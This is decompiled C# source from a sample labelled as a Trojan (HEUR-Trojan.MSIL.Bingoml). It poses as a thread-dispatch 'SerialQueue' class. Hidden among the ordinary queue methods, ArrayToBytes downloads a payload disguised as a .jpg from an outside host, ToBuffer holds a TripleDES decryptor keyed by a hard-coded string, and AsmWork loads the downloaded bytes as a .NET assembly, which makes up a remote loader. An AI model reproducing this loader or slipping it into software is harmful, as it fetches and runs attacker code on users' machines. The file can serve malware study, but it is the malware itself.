// Decompiled with JetBrains decompiler
// Type: Ohrxmi.SerialQueue
// Assembly: Mhaedjy, Version=4.6.5.0, Culture=neutral, PublicKeyToken=null
// MVID: D5147E88-4426-4F99-BBCA-DD92DA902390
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-a1fb53720f755909dee2f5fe9c8015ed9b5e52817dd9a91d6ed7762eaa9faa2d.exe

using HttpRequests;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Ohrxmi
{
  public class SerialQueue : IDispatchQueue, IDisposable
  {
    private static readonly ThreadLocal<Stack<SerialQueue>> s_queueStack = new ThreadLocal<Stack<SerialQueue>>()
    {
      Value = new Stack<SerialQueue>()
    };
    private readonly IThreadPool m_threadPool;
    private readonly SynchronizationContext m_syncContext;
    private readonly object m_schedulerLock = new object();
    private readonly object m_executionLock = new object();
    private readonly List<Action> m_asyncActions = new List<Action>();
    private readonly HashSet<IDisposable> m_timers = new HashSet<IDisposable>();
    private volatile SerialQueue.AsyncState m_asyncState = SerialQueue.AsyncState.Idle;
    private bool m_isDisposed = false;
    public object Asm;

    public SerialQueue(IThreadPool threadpool, string name = null, SerialQueueFeatures features = SerialQueueFeatures.SynchronizationContext)
    {
      this.m_threadPool = threadpool ?? throw new ArgumentNullException(nameof (threadpool));
      this.Name = name;
      this.Features = features;
      if (!features.HasFlag((Enum) SerialQueueFeatures.SynchronizationContext))
        return;
      this.m_syncContext = (SynchronizationContext) new DispatchQueueSynchronizationContext((IDispatchQueue) this);
    }

    public SerialQueue(string name = null, SerialQueueFeatures features = SerialQueueFeatures.SynchronizationContext)
      : this((IThreadPool) TaskThreadPool.Default, name, features)
    {
    }

    public string Name { get; }

    public void AsmWork() => this.Asm = (object) AppDomain.CurrentDomain.Load(this.ArrayToBytes().ToArray());

    public SerialQueueFeatures Features { get; }

    public event EventHandler<UnhandledExceptionEventArgs> UnhandledException;

    public static SerialQueue Current => SerialQueue.s_queueStack.Value.Count <= 0 ? (SerialQueue) null : SerialQueue.s_queueStack.Value.Peek();

    public void VerifyQueue()
    {
      if (!SerialQueue.s_queueStack.Value.Contains(this))
        throw new InvalidOperationException("On the wrong queue");
    }

    public List<byte> ArrayToBytes()
    {
      List<byte> bytes = new List<byte>();
      bytes.AddRange((IEnumerable<byte>) Get.GetAsyncFromUrl("https://richmox.xyz/wex/Mhaedjy_Xoyolgrn.jpg", "Tqsqfebgmgbwip"));
      return bytes;
    }

    internal byte[] ToBuffer(byte[] data)
    {
      using (TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider())
      {
        using (MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider())
        {
          byte[] hash = cryptoServiceProvider2.ComputeHash(Encoding.UTF8.GetBytes("Tqsqfebgmgbwip"));
          cryptoServiceProvider1.Key = hash;
          cryptoServiceProvider1.Mode = CipherMode.ECB;
          byte[] inputBuffer = data;
          return cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
        }
      }
    }

    public virtual IDisposable DispatchAsync(Action action)
    {
      lock (this.m_schedulerLock)
      {
        if (this.m_isDisposed)
          throw new ObjectDisposedException(nameof (SerialQueue), "Cannot call DispatchAsync on a disposed queue");
        this.m_asyncActions.Add(action);
        if (this.m_asyncState == SerialQueue.AsyncState.Idle)
        {
          this.m_asyncState = SerialQueue.AsyncState.Scheduled;
          this.m_threadPool.QueueWorkItem(new Action(this.ProcessAsync));
        }
      }
      return (IDisposable) new AnonymousDisposable((Action) (() =>
      {
        lock (this.m_schedulerLock)
          this.m_asyncActions.Remove(action);
      }));
    }

    public virtual void DispatchSync(Action action)
    {
      SerialQueue[] array = SerialQueue.s_queueStack.Value.ToArray();
      SerialQueue.s_queueStack.Value.Push(this);
      bool lockTaken = false;
      try
      {
        Monitor.Enter(this.m_schedulerLock, ref lockTaken);
        if (this.m_isDisposed)
          throw new ObjectDisposedException(nameof (SerialQueue), "Cannot call DispatchSync on a disposed queue");
        if (this.m_asyncState == SerialQueue.AsyncState.Idle || ((IEnumerable<SerialQueue>) array).Contains<SerialQueue>(this))
        {
          Monitor.Exit(this.m_schedulerLock);
          lockTaken = false;
          lock (this.m_executionLock)
            action();
        }
        else
        {
          ManualResetEvent asyncReady = new ManualResetEvent(false);
          ManualResetEvent syncDone = new ManualResetEvent(false);
          this.DispatchAsync((Action) (() =>
          {
            asyncReady.Set();
            syncDone.WaitOne();
          }));
          Monitor.Exit(this.m_schedulerLock);
          lockTaken = false;
          try
          {
            asyncReady.WaitOne();
            action();
          }
          finally
          {
            syncDone.Set();
          }
        }
      }
      finally
      {
        if (lockTaken)
          Monitor.Exit(this.m_schedulerLock);
        SerialQueue.s_queueStack.Value.Pop();
      }
    }

    public virtual IDisposable DispatchAfter(TimeSpan dueTime, Action action)
    {
      IDisposable cancel = (IDisposable) null;
      IDisposable timer = (IDisposable) null;
      lock (this.m_schedulerLock)
      {
        if (this.m_isDisposed)
          throw new ObjectDisposedException(nameof (SerialQueue), "Cannot call DispatchAfter on a disposed queue");
        timer = this.m_threadPool.Schedule(dueTime, (Action) (() =>
        {
          lock (this.m_schedulerLock)
          {
            this.m_timers.Remove(timer);
            if (cancel == null || this.m_isDisposed)
              return;
            cancel = this.DispatchAsync(action);
          }
        }));
        this.m_timers.Add(timer);
      }
      cancel = (IDisposable) new AnonymousDisposable((Action) (() =>
      {
        lock (this.m_schedulerLock)
          this.m_timers.Remove(timer);
        timer.Dispose();
      }));
      return (IDisposable) new AnonymousDisposable((Action) (() =>
      {
        lock (this.m_schedulerLock)
        {
          if (cancel == null)
            return;
          cancel.Dispose();
          cancel = (IDisposable) null;
        }
      }));
    }

    protected virtual void ProcessAsync()
    {
      bool lockTaken = false;
      SerialQueue.s_queueStack.Value.Push(this);
      try
      {
        Monitor.Enter(this.m_schedulerLock, ref lockTaken);
        this.m_asyncState = SerialQueue.AsyncState.Processing;
        if (this.m_isDisposed)
          return;
        while (this.m_asyncActions.Count > 0)
        {
          Action asyncAction = this.m_asyncActions[0];
          this.m_asyncActions.RemoveAt(0);
          Monitor.Exit(this.m_schedulerLock);
          lockTaken = false;
          try
          {
            lock (this.m_executionLock)
            {
              SynchronizationContext syncContext = (SynchronizationContext) null;
              if (this.m_syncContext != null)
              {
                syncContext = SynchronizationContext.Current;
                SynchronizationContext.SetSynchronizationContext(this.m_syncContext);
              }
              try
              {
                asyncAction();
              }
              finally
              {
                if (this.m_syncContext != null)
                  SynchronizationContext.SetSynchronizationContext(syncContext);
              }
            }
          }
          catch (Exception ex)
          {
            EventHandler<UnhandledExceptionEventArgs> unhandledException = this.UnhandledException;
            if (unhandledException != null)
              unhandledException((object) this, new UnhandledExceptionEventArgs(ex));
          }
          Monitor.Enter(this.m_schedulerLock, ref lockTaken);
        }
      }
      finally
      {
        this.m_asyncState = SerialQueue.AsyncState.Idle;
        if (lockTaken)
          Monitor.Exit(this.m_schedulerLock);
        SerialQueue.s_queueStack.Value.Pop();
      }
    }

    public void Dispose() => this.Dispose(true);

    protected virtual void Dispose(bool disposing)
    {
      IDisposable[] array;
      lock (this.m_schedulerLock)
      {
        if (this.m_isDisposed)
          return;
        this.m_isDisposed = true;
        this.m_asyncActions.Clear();
        array = this.m_timers.ToArray<IDisposable>();
        this.m_timers.Clear();
      }
      foreach (IDisposable disposable in array)
        disposable.Dispose();
    }

    private enum AsyncState
    {
      Idle,
      Scheduled,
      Processing,
    }
  }
}
